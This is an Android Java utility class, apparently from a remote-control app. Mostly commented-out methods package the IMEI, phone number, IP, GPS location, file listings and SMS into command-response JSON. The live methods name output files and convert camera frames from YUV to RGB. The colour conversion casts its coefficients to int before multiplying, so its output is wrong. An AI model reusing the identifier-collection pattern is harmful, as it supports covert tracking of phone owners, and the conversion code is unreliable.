package com.lfish.control.action.actiontool;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import android.content.Context;
import android.telephony.TelephonyManager;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;


public class CmdUtils {
//	public static String  GetJsonbyDeviceData(Context context,String cmd)
//	{
//		DeviceData data = new DeviceData();
//		data.SetPhoneModel(android.os.Build.MODEL);
//		data.SetNetType(Utils.GetNetStatus(context));
//		data.SetIP(Utils.GetOutIpAddress());
//		data.SetOrder(cmd);
//		data.SetPhoneSystem("android"+android.os.Build.VERSION.RELEASE);
//		data.SetSRC("Phone");
//		data.SetUUID(Utils.GetMyUUID());
//		data.SetIMEI(Utils.GetIMEI(context));
//		TelephonyManager phoneMgr=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
//		data.SetTel(phoneMgr.getLine1Number());
//		Gson g=new Gson();
//		return g.toJson(data);
//		
//	}
//	public static String GetLocJsonbyCmd(Context context, boolean Success, String  UUID,String  Order,
//			String  ErrMsg,String  SRC,String  FileName,long Time)
//	{
////		CmdData<LocationData> data = new CmdData<LocationData>();
////		data.SetErrMsg(ErrMsg);
////		data.SetFileName(FileName);
////		data.SetIsSuccess(Success);
////		data.SetOrder(Order);
////		LocationData ld = new LocationData();
////		ld.SetLatitude(share.getfloat(context, share.Config, share.Gps_Latitude));
////		ld.SetLongitude(share.getfloat(context, share.Config, share.Gps_Longitude));
////		data.SetReturnData(ld);
////		data.SetSRC(SRC);
////		data.SetTime(Time);
////		data.SetUUID(UUID);
////		String res1 = data.toJson(LocationData.class);
////	    MyLog.e("Loc value",res1);
//		
//		CmdData<String> data = new CmdData<String>();
//		data.SetErrMsg(ErrMsg);
//		data.SetFileName(FileName);
//		data.SetIsSuccess(Success);
//		data.SetOrder(Order);
//		LocationData ld = new LocationData();
//		ld.SetLatitude(ShareUtils.getfloat(context, ShareUtils.Config, ShareUtils.Gps_Latitude));
//		ld.SetLongitude(ShareUtils.getfloat(context, ShareUtils.Config, ShareUtils.Gps_Longitude));
//		Gson gson = new Gson();
//		String ldstr = gson.toJson(ld);
//		data.SetReturnData(ldstr);
//		data.SetSRC(SRC);
//		data.SetTime(Time);
//		data.SetUUID(UUID);
//		String res1 = GetJsonStrbyCmd(data);
//	    MyLog.e("Loc value",res1);
//		return res1;
//	}
//	public static String GetFileJsonbyCmd(boolean Success, String  UUID,String  Order,List<FileData> FileDatalist
//		,	String  ErrMsg,String  SRC,String  FileName,long Time)
//	{
//		CmdListData<FileData> data = new CmdListData<FileData>();
//		data.SetErrMsg(ErrMsg);
//		data.SetFileName(FileName);
//		data.SetIsSuccess(Success);
//		data.SetOrder(Order);
//		data.SetReturnData(FileDatalist);
//		data.SetSRC(SRC);
//		data.SetTime(Time);
//		data.SetUUID(UUID);
//		String res1 = data.toJson(FileData.class);
//	    MyLog.e("GetFileJsonbyCmd value",res1);
//		return res1;
//	}
//	public static String GetJsonbyCmd(boolean Success, String  UUID,String  Order,String  ReturnData,
//			String  ErrMsg,String  SRC,String  FileName,long Time)
//	{
//		CmdData<String> data = new CmdData<String>();
//		data.SetErrMsg(ErrMsg);
//		data.SetFileName(FileName);
//		data.SetIsSuccess(Success);
//		data.SetOrder(Order);
//		data.SetSRC(SRC);
//		data.SetTime(Time);
//		data.SetUUID(UUID);
//		data.SetReturnData(ReturnData);
//		return GetJsonStrbyCmd(data);
//	}
//	public static String GetJsonStrbyCmd(CmdData<String> data)
//	{
//		Gson g= new GsonBuilder().serializeNulls().create();
//		return g.toJson(data);
//	}
	@SuppressWarnings("unchecked")
//	public static CmdData<String> GetCmdByJson(String cmd)
//	{
//		CmdData<String> user = CmdData.fromJson(cmd, String.class); 
////		MyLog.e("CMddata value",GetJsonStrbyCmd(user));
//		return user;
//	}
//	public static SMSData GetSMSByJson(String json)
//	{
//		  Gson gson = new GsonBuilder().serializeNulls().create();
//	      return gson.fromJson(json, SMSData.class);
//	}
	public static String GetFileName(Context context,String Cmd,String suffix)
	{
		StringBuilder objString = new StringBuilder();
		objString.append(Cmd);
		objString.append("_");
		objString.append(Utils.GetMyUUID());
		objString.append("_");
	    SimpleDateFormat   sDateFormat   =   new   SimpleDateFormat("yyyyMMddHHmmss",Locale.getDefault());     
	    String   date   =   sDateFormat.format(new   java.util.Date());  
		objString.append(date);
		objString.append(".");
		objString.append(suffix);
		String sReturn = objString.toString();
		return sReturn;
	    
		//Order_IMEI_ʱ��  
		
	}
//	public static List<FileData> searchFile(String path) { 
//		List<FileData>	FileDatalist = new ArrayList<FileData>();
//		File mainfile =  new File(path);
//		if(mainfile.exists())
//		{
//		   File[] files = mainfile.listFiles(); 
//		   if(files!=null){
//		   for (File file : files) { 
//			   Zip.filedata(file.getAbsolutePath());
//				   FileData fd = new FileData();
//			 if(file.isDirectory()){
//				fd.SetFilePath(file.getAbsolutePath());
//				fd.SetIsFile(false);
//				if(file.list()!=null && file.list().length > 0)
//					fd.SetHaveList(true);
//				else
//					fd.SetHaveList(false);
//			 }
//			 else{
//				 fd.SetFilePath(file.getAbsolutePath());
//				 fd.SetIsFile(true);
//				 fd.SetHaveList(false);
//			 }
//			 FileDatalist.add(fd);
//			} 
//		   }
//		}
//		   return FileDatalist;
//	}

	public static int[] convertYUV420_NV21toRGB8888(byte [] data, int width, int height) {
	    int size = width*height;
	    int offset = size;
	    int[] pixels = new int[size];
	    int u, v, y1, y2, y3, y4;

	    // i percorre os Y and the final pixels
	    // k percorre os pixles U e V
	    for(int i=0, k=0; i < size; i+=2, k+=2) {
	        y1 = data[i  ]&0xff;
	        y2 = data[i+1]&0xff;
	        y3 = data[width+i  ]&0xff;
	        y4 = data[width+i+1]&0xff;

	        u = data[offset+k  ]&0xff;
	        v = data[offset+k+1]&0xff;
	        u = u-128;
	        v = v-128;

	        pixels[i  ] = convertYUVtoRGB(y1, u, v);
	        pixels[i+1] = convertYUVtoRGB(y2, u, v);
	        pixels[width+i  ] = convertYUVtoRGB(y3, u, v);
	        pixels[width+i+1] = convertYUVtoRGB(y4, u, v);

	        if (i!=0 && (i+2)%width==0)
	            i+=width;
	    }

	    return pixels;
	}

	private static int convertYUVtoRGB(int y, int u, int v) {
	    int r,g,b;

	    r = y + (int)1.402f*v;
	    g = y - (int)(0.344f*u +0.714f*v);
	    b = y + (int)1.772f*u;
	    r = r>255? 255 : r<0 ? 0 : r;
	    g = g>255? 255 : g<0 ? 0 : g;
	    b = b>255? 255 : b<0 ? 0 : b;
	    return 0xff000000 | (b<<16) | (g<<8) | r;
	}

}
